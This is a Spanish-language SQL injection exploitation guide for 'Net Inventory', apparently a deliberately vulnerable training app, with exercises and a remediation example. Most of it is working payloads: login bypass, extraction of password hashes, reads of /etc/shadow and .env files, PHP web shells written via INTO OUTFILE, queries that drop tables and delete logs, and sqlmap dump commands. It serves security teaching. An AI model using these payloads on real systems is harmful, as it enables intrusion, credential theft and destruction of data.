# SQL Injection Testing Guide

## Guía Práctica de Explotación

Este documento contiene ejemplos prácticos de explotación de SQL Injection para el sistema Net Inventory.

---

## 🎯 Puntos de Inyección Identificados

### 1. Login Form (`/login`)

#### Payloads de Bypass

```sql
-- Bypass básico con OR
Username: admin' OR '1'='1
Password: cualquier_cosa

-- Bypass con comentarios
Username: admin'--
Password: (vacío)

-- Bypass específico de usuario
Username: admin' OR username='admin'--
Password: x

-- UNION-based injection
Username: ' UNION SELECT 1,'admin','test@test.com','$2y$10$fake',admin','Admin User',NOW(),NOW(),1--
Password: x
```

#### Extracción de Información

```sql
-- Contar usuarios
Username: admin' AND (SELECT COUNT(*) FROM users)>0--
Password: x

-- Extraer primer usuario
Username: ' UNION SELECT 1,username,email,password_hash,role,full_name,created_at,last_login,is_active FROM users LIMIT 1--
Password: x

-- Boolean-based blind
Username: admin' AND LENGTH(password_hash)>50--
Password: x
```

---

### 2. Device Search (`/devices?search=`)

#### Union-Based Injection

```sql
-- Estructura de la tabla (15 columnas)
/devices?search=%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--

-- Extraer usuarios
/devices?search=%' UNION SELECT 1,username,password_hash,email,role,full_name,7,8,9,10,created_at,12,13,14,15 FROM users--

-- Extraer configuraciones
/devices?search=%' UNION SELECT 1,filename,content,4,uploaded_at,6,7,8,9,10,11,12,13,14,15 FROM configs--

-- Listar bases de datos
/devices?search=%' UNION SELECT 1,schema_name,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM information_schema.schemata--

-- Listar tablas
/devices?search=%' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM information_schema.tables WHERE table_schema='net_inventory'--

-- Listar columnas
/devices?search=%' UNION SELECT 1,column_name,table_name,4,5,6,7,8,9,10,11,12,13,14,15 FROM information_schema.columns WHERE table_schema='net_inventory'--
```

#### Error-Based Injection

```sql
-- Generar error con información
/devices?search=' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password_hash FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--

-- Extraer versión
/devices?search=' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

#### Time-Based Blind Injection

```sql
-- Test básico (5 segundos de delay)
/devices?search=%' AND SLEEP(5)--

-- Conditional delay
/devices?search=%' AND IF(LENGTH((SELECT password_hash FROM users WHERE username='admin'))>50,SLEEP(5),0)--

-- Extraer datos carácter por carácter
/devices?search=%' AND IF(ASCII(SUBSTRING((SELECT password_hash FROM users WHERE username='admin'),1,1))>60,SLEEP(3),0)--
```

---

### 3. Device View (`/devices/{id}`)

#### Error-Based

```sql
# URL: /devices/1 AND 1=0 UNION SELECT 1,username,password_hash,4,5,6,7,8,9,10,11,12,13,14,15 FROM users--

# Extraer configuración
/devices/1 UNION SELECT 1,2,content,4,filename,6,7,8,9,10,11,12,13,14,15 FROM configs WHERE device_id=1--
```

---

### 4. Custom Query Tool (`/?custom_query=`)

**Solo accesible para rol admin**

#### Lectura de Archivos del Sistema

```sql
# Linux
/?custom_query=SELECT LOAD_FILE('/etc/passwd')
/?custom_query=SELECT LOAD_FILE('/etc/shadow')
/?custom_query=SELECT LOAD_FILE('/var/www/html/.env')

# Windows
/?custom_query=SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')
/?custom_query=SELECT LOAD_FILE('C:\\xampp\\htdocs\\net-inventory\\.env')
```

#### Escritura de Archivos (Web Shell)

```sql
# Escribir shell PHP
/?custom_query=SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

# Shell más sofisticado
/?custom_query=SELECT '<?php eval($_POST["code"]); ?>' INTO OUTFILE '/tmp/backdoor.php'
```

#### Extracción Masiva de Datos

```sql
# Dump completo de usuarios
/?custom_query=SELECT GROUP_CONCAT(username,':',password_hash SEPARATOR '\n') FROM users

# Dump de configuraciones
/?custom_query=SELECT GROUP_CONCAT(hostname,':',filename SEPARATOR '\n') FROM configs c JOIN devices d ON c.device_id=d.id

# Metadata de la base de datos
/?custom_query=SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='net_inventory'
```

---

### 5. Export Filter (`/devices/export?filter=`)

#### Data Exfiltration

```sql
# Exportar usuarios como dispositivos
/devices/export?format=csv&filter=1=0) UNION SELECT username,password_hash,email,role,NULL,NULL,NULL,NULL FROM users--

# Exportar todo el change_log
/devices/export?filter=1=1) UNION SELECT action,details,username,created_at,NULL,NULL,NULL,NULL FROM change_log cl JOIN users u ON cl.user_id=u.id--
```

#### Stacked Queries (si PDO::ATTR_EMULATE_PREPARES = true)

```sql
# Crear nuevo usuario admin
/devices/export?filter=1=1); INSERT INTO users (username,password_hash,role) VALUES ('hacker','$2y$10$hash','admin');--

# Eliminar logs
/devices/export?filter=1=1); DELETE FROM change_log;--

# Modificar contraseña
/devices/export?filter=1=1); UPDATE users SET password_hash='$2y$10$newhash' WHERE username='admin';--
```

---

### 6. Device Creation/Update

#### Second-Order SQL Injection

```sql
# POST /devices/create
hostname: '); DROP TABLE devices; --
notes: '); UPDATE users SET role='admin' WHERE username='viewer1'; --

# Estas queries se ejecutarán cuando se lean posteriormente
```

---

## 🛠️ Herramientas de Automatización

### SQLMap

#### Login Form
```bash
# Basic test
sqlmap -u "http://localhost:8000/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 --batch

# Dump databases
sqlmap -u "http://localhost:8000/login" \
  --data="username=admin&password=test" \
  --dbs --dump

# Dump specific table
sqlmap -u "http://localhost:8000/login" \
  --data="username=admin&password=test" \
  -D net_inventory -T users --dump
```

#### Device Search
```bash
# Test search parameter
sqlmap -u "http://localhost:8000/devices?search=test" \
  --cookie="NET_INV_SESSION=your_session_id" \
  --level=5 --risk=3

# Enumerate databases
sqlmap -u "http://localhost:8000/devices?search=test" \
  --cookie="NET_INV_SESSION=your_session_id" \
  --dbs

# Read files
sqlmap -u "http://localhost:8000/devices?search=test" \
  --cookie="NET_INV_SESSION=your_session_id" \
  --file-read="/etc/passwd"
```

---

## 📝 Ejemplo de Reporte de Vulnerabilidad

### VULNERABILITY REPORT

**Título:** SQL Injection en formulario de autenticación

**Severidad:** CRÍTICA (CVSS 9.8)

**Descripción:**
El sistema Net Inventory es vulnerable a SQL Injection en el endpoint de autenticación (`/login`). Un atacante no autenticado puede:
- Bypasear la autenticación sin credenciales válidas
- Extraer información sensible de la base de datos
- Ejecutar comandos SQL arbitrarios

**Ubicación:** 
- Archivo: `src/Controller/AuthController.php`
- Método: `login()`
- Línea: 52-54

**Código Vulnerable:**
```php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$query = "SELECT * FROM users WHERE username = '{$username}' AND password_hash = '{$password}'";
$stmt = $this->db->query($query);
```

**Proof of Concept:**
```
POST /login HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded

username=admin'+OR+'1'='1&password=x
```

**Resultado:** Acceso exitoso como usuario administrador sin contraseña válida.

**Impacto:**
- Acceso no autorizado al sistema
- Compromiso de cuentas de usuario
- Extracción completa de base de datos
- Posible RCE mediante INTO OUTFILE

**Remediación:**
```php
// Usar prepared statements
$stmt = $this->db->prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();

// Validar contraseña con password_verify()
if ($user && password_verify($password, $user['password_hash'])) {
    // Login exitoso
}
```

**Referencias:**
- OWASP Top 10 2021: A03 Injection
- CWE-89: SQL Injection

---

## 11. IP Assignment Management

### Ubicación: `IpController.php`

#### assign() - Asignación de IP

**Vulnerable Code:**
```php
$query = "INSERT INTO ip_assignments 
          (device_id, interface_id, ip, prefix, assigned_for)
          VALUES 
          ({$deviceId}, {$interfaceId}, INET6_ATON('{$ip}'), {$prefix}, '{$assignedFor}')";
```

**Explotación:**
```bash
# Via Burp Suite - Capturar POST /ip/assign

# Payload 1: Stacked query
device_id=1&interface_id=1&ip=192.168.1.1&prefix=24&assigned_for=test'); DROP TABLE ip_assignments;--

# Payload 2: Inject en INET6_ATON
ip=1.1.1.1') OR SLEEP(5) OR INET6_ATON('192.168.1.1

# Payload 3: Second-order injection
assigned_for=normal'); INSERT INTO users (username,password_hash,role) VALUES ('hacked','$2y$10$fakeHash','admin');--
```

**Impacto:**
- Inserción de IPs maliciosas
- Bypass de validación de formato IP
- Second-order injection vía change_log
- Manipulación de interfaces

#### delete() - Eliminación de IP

**Vulnerable Code:**
```php
$query = "SELECT device_id FROM ip_assignments WHERE id = {$id}";
$deleteQuery = "DELETE FROM ip_assignments WHERE id = {$id}";
```

**Explotación:**
```bash
# URL: /ip/ID/delete con POST

# Payload: Eliminar todas las IPs
curl -X POST http://localhost/ip/1%20OR%201=1/delete

# Payload: UNION en SELECT previo
curl -X POST http://localhost/ip/1%20UNION%20SELECT%201/delete
```

#### index() - Listado de IPs

**Vulnerable Code:**
```php
if (!empty($search)) {
    $query .= " AND (INET6_NTOA(ia.ip) LIKE '%{$search}%' 
                OR d.hostname LIKE '%{$search}%'
                OR ia.assigned_for LIKE '%{$search}%')";
}
```

**Explotación:**
```bash
# URL: /ip?search=PAYLOAD

# Payload 1: UNION-based
/ip?search=%' UNION SELECT 1,2,username,password_hash,5,6,role FROM users--

# Payload 2: Extracting interface data
/ip?search=%' UNION SELECT i.id,i.device_id,i.name,i.description,i.speed,i.ip,i.admin_status FROM interfaces i--

# Payload 3: Time-based blind
/ip?search=%' AND IF(SUBSTRING((SELECT password_hash FROM users WHERE role='admin' LIMIT 1),1,1)='$',SLEEP(5),0) AND '1'='1

# Payload 4: Boolean-based blind
/ip?search=%' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0 AND '1'='1
```

#### checkAvailability() - Verificación de disponibilidad

**Vulnerable Code:**
```php
$query = "SELECT COUNT(*) as count 
          FROM ip_assignments 
          WHERE INET6_NTOA(ip) = '{$ip}'";
```

**Explotación:**
```bash
# URL: /ip/check?ip=PAYLOAD

# Payload 1: Boolean-based
/ip/check?ip=1.1.1.1' OR '1'='1

# Payload 2: UNION injection
/ip/check?ip=' UNION SELECT (SELECT COUNT(*) FROM users) as count--

# Payload 3: Extraer contraseñas
/ip/check?ip=' UNION SELECT password_hash as count FROM users WHERE username='admin'--

# Respuesta JSON expondrá datos
```

**Vector de Ataque Completo:**
```bash
# 1. Enumerar IPs existentes
curl "http://localhost/ip?search="

# 2. Verificar tabla users vía checkAvailability
curl "http://localhost/ip/check?ip=' UNION SELECT COUNT(*) FROM users--"

# 3. Extraer usuario admin
curl "http://localhost/ip/check?ip=' UNION SELECT username FROM users WHERE role='admin'--"

# 4. Asignar IP con second-order injection
curl -X POST http://localhost/ip/assign \
  -d "device_id=1&interface_id=1&ip=1.1.1.1&prefix=24&assigned_for=test'); UPDATE users SET role='admin' WHERE username='viewer';--"

# 5. Verificar en change_log la ejecución
curl "http://localhost/?custom_query=SELECT * FROM change_log ORDER BY id DESC LIMIT 1"
```

---

## 🎓 Ejercicios Prácticos

### Ejercicio 1: Bypass de Login
**Objetivo:** Acceder al sistema sin credenciales válidas
**Dificultad:** Principiante
**Pistas:** Usa comentarios SQL (--) y operadores lógicos (OR)

### Ejercicio 2: Extracción de Usuarios
**Objetivo:** Obtener todos los usuarios y sus hashes
**Dificultad:** Intermedio
**Pistas:** Usa UNION SELECT con la cantidad correcta de columnas

### Ejercicio 3: Blind SQL Injection
**Objetivo:** Extraer el password_hash del admin usando time-based
**Dificultad:** Avanzado
**Pistas:** Combina IF(), ASCII(), SUBSTRING() y SLEEP()

### Ejercicio 4: File Read/Write
**Objetivo:** Leer /etc/passwd y escribir un web shell
**Dificultad:** Experto
**Pistas:** Usa LOAD_FILE() y INTO OUTFILE

### Ejercicio 5: IP Assignment Exploitation
**Objetivo:** Inyectar código SQL a través del módulo de IPs
**Dificultad:** Intermedio
**Pistas:** Usa second-order injection en assigned_for + change_log

---

## ⚠️ Disclaimer

Estos ejemplos son para **uso educativo** en entornos controlados. 
Realizar pruebas de penetración sin autorización es **ILEGAL**.

---

**Versión del documento:** 1.0  
**Fecha:** Noviembre 2025
